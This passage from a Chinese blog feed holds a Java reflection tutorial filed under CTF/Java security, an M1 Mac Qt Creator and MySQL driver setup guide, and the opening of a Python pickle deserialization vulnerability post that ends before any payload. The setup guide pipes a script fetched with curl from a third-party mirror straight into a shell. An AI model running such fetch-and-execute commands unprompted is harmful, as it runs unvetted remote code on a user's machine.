class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射获取成员变量</span></span><br><span class="line">Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line"><span class="comment">//getFields方法，获取该Class对象表示的类或接口的所有可访问的public字段</span></span><br><span class="line"><span class="comment">//getDeclaredFields方法，获取该Class对象表示的类或接口的所有字段</span></span><br><span class="line">Field[] fields = c.getFields();</span><br><span class="line"><span class="keyword">for</span>(Field filed: fields)&#123;</span><br><span class="line">  System.out.println(filed);<span class="comment">//只得到public的变量</span></span><br><span class="line">&#125;</span><br><span class="line">Field[] fields1 = c.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span>(Field f:fields1)</span><br><span class="line">&#123;</span><br><span class="line">  System.out.println(f);<span class="comment">//得到所有成员变量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据指定名称</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">ad</span> <span class="operator">=</span> c.getField(<span class="string">&quot;address&quot;</span>);<span class="comment">//要抛出异常</span></span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line">Object obj=con.newInstance();</span><br><span class="line">ad.set(obj,<span class="string">&quot;339&quot;</span>);<span class="comment">//给obj的成员变量ad赋值为&quot;339&quot;</span></span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//练习</span></span><br><span class="line">Class&lt;?&gt; c=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line">Object obj=con.newInstance();</span><br><span class="line"><span class="comment">//name是私有成员</span></span><br><span class="line">Field namef=c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">namef.setAccessible(<span class="literal">true</span>);<span class="comment">//取消访问检查</span></span><br><span class="line">namef.set(obj,<span class="string">&quot;sqhy&quot;</span>);</span><br><span class="line">System.out.println(obj);</span><br><span class="line"><span class="type">Field</span> <span class="variable">agef</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">agef.setAccessible(<span class="literal">true</span>);</span><br><span class="line">agef.set(obj,<span class="number">4781</span>);</span><br><span class="line">System.out.println(obj);</span><br><span class="line"><span class="type">Field</span> <span class="variable">addressf</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;address&quot;</span>);</span><br><span class="line">addressf.setAccessible(<span class="literal">true</span>);</span><br><span class="line">addressf.set(obj,<span class="string">&quot;339&quot;</span>);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure></div><h3 id="反射获取成员方法"><a href="#反射获取成员方法" class="headerlink" title="反射获取成员方法"></a>反射获取成员方法</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032251236.jpg"                      alt="image-20220716014440272"                ><figcaption>image-20220716014440272</figcaption></figure></p><blockquote><p>注：<code>getDeclaredMethods</code>方法只有本类的所有方法，没有由类或接口声明的对象以及从超类或超级接口继承的类</p></blockquote><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射获取成员方法</span></span><br><span class="line">Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line">Method[] methods = c.getMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:methods) &#123;</span><br><span class="line">  System.out.println(m);<span class="comment">//所有public方法，以及由类或接口声明的对象以及从超类或超级接口继承的类</span></span><br><span class="line">&#125;</span><br><span class="line">Method[] methods1 = c.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:methods1) &#123;</span><br><span class="line">  System.out.println(m);<span class="comment">//只有本类的所有方法，没有由类或接口声明的对象以及从超类或超级接口继承的类</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;---------&quot;</span>);</span><br><span class="line"><span class="comment">//获取单个</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;method1&quot;</span>);</span><br><span class="line"><span class="comment">//获取无参构造方法创建对象并调用method1方法</span></span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> con.newInstance();</span><br><span class="line"><span class="comment">//Object invoke(Object obj,Object...args) 在具有指定参数的指定对象上调用方法</span></span><br><span class="line"><span class="comment">//Object 返回值类型</span></span><br><span class="line"><span class="comment">//obj调用方法的对象</span></span><br><span class="line"><span class="comment">//args 方法所需的参数</span></span><br><span class="line">m.invoke(obj);<span class="comment">//method1没有参数,成功调用类method1方法</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//练习</span></span><br><span class="line">Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> con.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;method1&quot;</span>);</span><br><span class="line">m1.invoke(obj);<span class="comment">//obj.method1()</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m2</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;method2&quot;</span>, String.class);</span><br><span class="line">m2.invoke(obj,<span class="string">&quot;sqhy&quot;</span>);<span class="comment">//obj.method2()</span></span><br><span class="line"><span class="comment">//调用有返回值的方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m3</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;method3&quot;</span>, String.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m3.invoke(obj, <span class="string">&quot;sqhy&quot;</span>, <span class="number">4781</span>);</span><br><span class="line">System.out.println(o);</span><br><span class="line"><span class="comment">//私有方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m4</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;function&quot;</span>);</span><br><span class="line">m4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">m4.invoke(obj);</span><br></pre></td></tr></table></figure></div><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><ul><li><p>在ArrayList<Integer>中插入一个字符串数据–越过泛型检查</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; array=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">array.add(<span class="number">10</span>);</span><br><span class="line">array.add(<span class="number">20</span>);</span><br><span class="line"><span class="comment">//array.add(&quot;asa&quot;);//报错</span></span><br><span class="line">System.out.println(array);<span class="comment">//[10, 20]</span></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&gt; c = array.getClass();</span><br><span class="line"><span class="comment">//获取到原始方法，从而绕过泛型检查</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;add&quot;</span>, Object.class);</span><br><span class="line">m.invoke(array,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">m.invoke(array,<span class="string">&quot;sqhy&quot;</span>);</span><br><span class="line">m.invoke(array,<span class="string">&quot;zql&quot;</span>);</span><br><span class="line">System.out.println(array);</span><br></pre></td></tr></table></figure></div></li><li><p>运行配置文件运行类的方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 配置文件</span></span><br><span class="line"><span class="comment">class.txt</span></span><br><span class="line"><span class="comment">className=xxx</span></span><br><span class="line"><span class="comment">methodName=xxx</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* className=com.itheima.S</span></span><br><span class="line"><span class="comment">methodName=study</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//加载数据</span></span><br><span class="line">Properties prop=<span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">FileReader fr=<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;./class.txt&quot;</span>);<span class="comment">//相对路径，这里.表示总文件夹（src的上一级）</span></span><br><span class="line">prop.load(fr);</span><br><span class="line">fr.close();</span><br><span class="line"><span class="comment">//通过键名获取值</span></span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> prop.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> prop.getProperty(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"><span class="comment">//通过反射使用</span></span><br><span class="line">Class&lt;?&gt; c = Class.forName(className);<span class="comment">//com.itheima.S</span></span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> con.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(methodName);<span class="comment">//study</span></span><br><span class="line">m.invoke(obj);</span><br></pre></td></tr></table></figure></div></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>M1 mac下搭建使用qt creator + QMYSQL驱动</title>
      <link href="/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/"/>
      <url>/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="💡前提：安装Xcode"><a href="#💡前提：安装Xcode" class="headerlink" title="💡前提：安装Xcode"></a>💡前提：安装Xcode</h3><h2 id="安装homebrew"><a href="#安装homebrew" class="headerlink" title="安装homebrew"></a>安装homebrew</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br></pre></td></tr></table></figure></div><p>选择中科大镜像，并安装弹窗中的命令行开发者工具，安装完再执行以上命令</p><p>切换国内安装源</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;$(brew --repo)&quot; &amp;&amp; git remote set-url origin git://mirrors.ustc.edu.cn/brew.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-cask&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git &amp;&amp; cd &quot;$(brew --repo)&quot;/Library/Taps/homebrew/homebrew-cask-versions &amp;&amp; git remote set-url origin https://github.com/Homebrew/homebrew-cask-versions.git</span><br></pre></td></tr></table></figure></div><p>重启终端，下载qt</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qt</span><br></pre></td></tr></table></figure></div><p>检验是否安装成功,执行以下命令，回显信息比较多，可以看见路径</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew info qt</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ub18t5pfj20vm0jq7a1.png"                      alt="1"                ><figcaption>1</figcaption></figure></p><h2 id="安装HomeBrew-Cask"><a href="#安装HomeBrew-Cask" class="headerlink" title="安装HomeBrew-Cask"></a>安装HomeBrew-Cask</h2><p>cask可以安装.app的软件</p><p>方法一：利用国内源手动clone下载（推荐）<br>创建homebrew-cask文件夹<br>进入homebrew目录：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;$(brew --repo)/Library/Taps/homebrew/&quot;</span><br></pre></td></tr></table></figure></div><p>创建homebrew-cask文件夹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir homebrew-cask</span><br></pre></td></tr></table></figure></div><p>开始clone</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git://mirrors.ustc.edu.cn/homebrew-cask.git/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask</span><br></pre></td></tr></table></figure></div><p>方法二：利用官网文件安装<br>从官网上下载<code>homebrew-cask-master.zip</code>压缩包，解压后将文件夹名改为<code>homebrew-cask</code><br>然后将其拷贝放入<code>/usr/local/Homebrew/Library/Taps/homebrew</code>中，与<code>homebrew-core</code>文件夹同级</p><blockquote><p>官网: <a class="link"   href="https://github.com/Homebrew/homebrew-cask" >https://github.com/Homebrew/homebrew-cask <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="安装qt-creator"><a href="#安装qt-creator" class="headerlink" title="安装qt creator"></a>安装qt creator</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qt-creator</span><br></pre></td></tr></table></figure></div><p>安装完发现启动台多了一个软件，打开</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ub7miil3j20bo086wej.png"                      alt="."                ><figcaption>.</figcaption></figure></p><h2 id="配置qt-creator"><a href="#配置qt-creator" class="headerlink" title="配置qt creator"></a>配置qt creator</h2><p>打开首选项<figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ub8lv3wbj20ds0e6gmk.png?"                      alt="."                ><figcaption>.</figcaption></figure></p><p>配置kits，主要是Qt Version和Debuggers</p><p>e6c9d24egy1h1ub8lv3wbj20ds0e6gmk<figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucbt7jxhj21ef0u0jvk.png"                      alt="2"                ><figcaption>2</figcaption></figure></p><h3 id="配置Qt-Version"><a href="#配置Qt-Version" class="headerlink" title="配置Qt Version"></a>配置Qt Version</h3><p>在终端先查看qt路径</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew info qt</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucdiut0nj21ce0hoq9l.png"                      alt="3"                ><figcaption>3</figcaption></figure></p><blockquote><p>以我这里为例是在<code>/opt/homebrew/Cellar/qt/6.2.3_1</code></p></blockquote><p>进入该文件夹，访问<code>bin</code>文件夹，找到qmake文件，最后将该路径填入Qt version</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/homebrew/Cellar/qt/6.2.3_1/bin/qmake</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucgvl5bhj21f70u0dk0.png"                      alt="4"                ><figcaption>4</figcaption></figure></p><h3 id="配置Debuggers"><a href="#配置Debuggers" class="headerlink" title="配置Debuggers"></a>配置Debuggers</h3><p>一般有默认自动检测到的LLDB，如果没有就添加我图示中Xcode下的LLDB(要先装Xcode)</p><p>路径：<code>/Applications/Xcode.app/Contents/Developer/usr/bin/lldb</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucjcdt7hj21dx0u00vy.png"                      alt="5"                ><figcaption>5</figcaption></figure></p><h3 id="返回到Kits选择刚刚配置好的版本"><a href="#返回到Kits选择刚刚配置好的版本" class="headerlink" title="返回到Kits选择刚刚配置好的版本"></a>返回到Kits选择刚刚配置好的版本</h3><p>一般情况下这里的编译器(Compiler)都会自动检测到本机所带环境，不用更改</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1uckxzx6bj21n00u0q81.png"                      alt="6"                ><figcaption>6</figcaption></figure></p><h3 id="新建一个项目"><a href="#新建一个项目" class="headerlink" title="新建一个项目"></a>新建一个项目</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucm7hh0gj21ni0u076u.png"                      alt="7"                ><figcaption>7</figcaption></figure></p><h3 id="选择模版"><a href="#选择模版" class="headerlink" title="选择模版"></a>选择模版</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucmnslqlj21c60u0acl.png"                      alt="8"                ><figcaption>8</figcaption></figure></p><h3 id="选择路径-不能带中文"><a href="#选择路径-不能带中文" class="headerlink" title="选择路径(不能带中文)"></a>选择路径(不能带中文)</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucnji2ynj218g0tcwgp.png"                      alt="9"                ><figcaption>9</figcaption></figure></p><h3 id="选择qmake"><a href="#选择qmake" class="headerlink" title="选择qmake"></a>选择qmake</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1uco09mb9j218g0tcgn0.png"                      alt="10"                ><figcaption>10</figcaption></figure></p><h3 id="剩下一直都点继续，直到Kits-选择刚刚配置的"><a href="#剩下一直都点继续，直到Kits-选择刚刚配置的" class="headerlink" title="剩下一直都点继续，直到Kits,选择刚刚配置的"></a>剩下一直都点继续，直到Kits,选择刚刚配置的</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucp7tqxcj218g0tc76c.png"                      alt="11"                ><figcaption>11</figcaption></figure></p><h3 id="构建项目"><a href="#构建项目" class="headerlink" title="构建项目"></a>构建项目</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucpqyve4j218g0tcjtd.png"                      alt="12"                ><figcaption>12</figcaption></figure></p><h3 id="运行项目，会自动生成一个默认的空白框"><a href="#运行项目，会自动生成一个默认的空白框" class="headerlink" title="运行项目，会自动生成一个默认的空白框"></a>运行项目，会自动生成一个默认的空白框</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucr1dk8zj20tg0gqdgs.png"                      alt="."                ><figcaption>.</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucrjmkltj20zu0si750.png"                      alt="."                ><figcaption>.</figcaption></figure></p><blockquote><p>具体的使用可以去b站搜qt教程</p></blockquote><h2 id="Qt搭配mysql"><a href="#Qt搭配mysql" class="headerlink" title="Qt搭配mysql"></a>Qt搭配mysql</h2><h3 id="动态链接库下载"><a href="#动态链接库下载" class="headerlink" title="动态链接库下载"></a>动态链接库下载</h3><p>若要搭配mysql写项目，需要添加动态链接库<code>libqsqlmysql.dylib</code>，网上大部分教程都是下载qt源码进行编译，但由于M1是arm64架构，编译的过程会有很多报错以及路径不对的问题，网上能下载的动态链接库也大多不是arm架构的，因此不得不提到mac下的神器<code>homebrew</code>,终端执行命令</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qt-mysql</span><br></pre></td></tr></table></figure></div><blockquote><p>brew会自动匹配下载最新qt版本的动态链接库，因此建议qt也使用homebrew安装</p></blockquote><p>进入目录<code>/opt/homebrew/Cellar/qt-mysql/6.2.3/share/qt/plugins/sqldrivers</code>将这个动态链接库放到<code>/opt/homebrew/Cellar/qt/6.2.3_1/share/qt/plugins/sqldrivers</code>中</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24ely1h4xfpipwhjj21fg0okgng.png"                      alt="13"                ><figcaption>13</figcaption></figure></p><blockquote><p>注意版本号对应</p></blockquote><h3 id="引入SQL模块"><a href="#引入SQL模块" class="headerlink" title="引入SQL模块"></a>引入SQL模块</h3><p>在项目的.pro文件的首行加上sql</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QT       += core gui sql <span class="comment">//修改处</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">greaterThan</span>(QT_MAJOR_VERSION, <span class="number">4</span>): QT += widgets</span><br><span class="line"></span><br><span class="line">CONFIG += c+<span class="number">+17</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div><h3 id="连接mysql数据库"><a href="#连接mysql数据库" class="headerlink" title="连接mysql数据库"></a>连接mysql数据库</h3><p>进入qt项目执行以下代码打印数据库驱动</p><p>mainwindow.cpp</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mainwindow.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_mainwindow.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;QSqlDatabase&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;QMessageBox&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;QSqlError&gt;</span></span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="built_in">qDebug</span>()&lt;&lt;QSqlDatabase::<span class="built_in">drivers</span>();<span class="comment">//查看当前可用驱动</span></span><br></pre></td></tr></table></figure></div><blockquote><p>可用驱动中有QMYSQL即为成功</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24ely1h4xg0zi3z4j20gk02yglv.png"                      alt="."                ><figcaption>.</figcaption></figure></p></blockquote><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">QSqlDatabase db=QSqlDatabase::<span class="built_in">addDatabase</span>(<span class="string">&quot;QMYSQL&quot;</span>);<span class="comment">//添加一个数据库</span></span><br><span class="line">db.<span class="built_in">setHostName</span>(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//设置主机ip</span></span><br><span class="line">db.<span class="built_in">setUserName</span>(<span class="string">&quot;username&quot;</span>);<span class="comment">//mysql数据库用户名</span></span><br><span class="line">db.<span class="built_in">setPassword</span>(<span class="string">&quot;password&quot;</span>);<span class="comment">//密码</span></span><br><span class="line">db.<span class="built_in">setDatabaseName</span>(<span class="string">&quot;db&quot;</span>);<span class="comment">//连接的数据库名</span></span><br><span class="line"><span class="keyword">if</span>(db.<span class="built_in">open</span>()==<span class="literal">false</span>)&#123;<span class="comment">//打开失败的警告</span></span><br><span class="line">    QMessageBox::<span class="built_in">warning</span>(<span class="keyword">this</span>,<span class="string">&quot;waring&quot;</span>,db.<span class="built_in">lastError</span>().<span class="built_in">text</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>运行项目只要没有警告框弹出就说明连接数据库成功</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> qt </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python pickle反序列化漏洞</title>
      <link href="/2022/08/03/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/08/03/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-Pickle反序列化漏洞"><a href="#Python-Pickle反序列化漏洞" class="headerlink" title="Python Pickle反序列化漏洞"></a>Python Pickle反序列化漏洞</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="0x00-Pickle-x2F-CPickle"><a href="#0x00-Pickle-x2F-CPickle" class="headerlink" title="0x00:Pickle&#x2F;CPickle"></a>0x00:Pickle&#x2F;CPickle</h3><p><code>pickle</code>或<code>cPickle</code>，作用和<code>PHP的serialize与unserialize</code>一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好,之后就以pickle库来进行演示</p><h3 id="0x01-Pickle库及函数"><a href="#0x01-Pickle库及函数" class="headerlink" title="0x01:Pickle库及函数"></a>0x01:Pickle库及函数</h3><p>pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。<br>pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为<code>.pkl</code>），不能直接打开进行预览。</p><table><thead><tr><th align="center">函数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">dumps</td><td align="center">对象反序列化为bytes对象</td></tr><tr><td align="center">dump</td><td align="center">对象反序列化到文件对象，存入文件</td></tr><tr><td align="center">loads</td><td align="center">从bytes对象反序列化</td></tr><tr><td align="center">load</td><td 